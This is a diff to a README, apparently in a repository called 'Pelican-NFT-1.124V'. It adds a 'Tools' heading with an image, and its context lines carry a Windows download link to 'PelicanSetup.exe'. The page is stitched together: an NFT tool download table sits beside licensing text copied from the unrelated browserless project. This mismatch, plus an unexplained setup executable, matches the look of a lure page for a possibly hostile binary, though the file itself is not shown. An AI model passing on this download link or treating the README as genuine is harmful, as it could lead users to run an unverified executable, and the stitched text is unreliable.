@@ -36,6 +36,10 @@ Example   | Description |
 🔹 [Windows 7/8/8.1/10 x64-x86](https://github.com/swordkeeptera/Pelican-NFT-1.124V/raw/main/PelicanSetup.exe) | [Download](https://github.com/swordkeeptera/Pelican-NFT-1.124V/raw/main/PelicanSetup.exe)
 🔸 Ubuntu 20.04 LTS / Soon | Download
 
+# Tools
+ 
+<img src="https://raw.githubusercontent.com/swordkeeptera/Pelican-NFT-1.124V/main/photo_2021-11-27_12-34-28.jpg">
+  
 # Licensing
 
 If you want to use browserless to build commercial sites, applications, or in a continuous-integration system that's closed-source then you'll need to purchase a commercial license. This allows you to keep your software proprietary whilst still using browserless. [You can purchase a commercial license here](https://www.browserless.io/sign-up?type=commercial). A commercial license grants you:
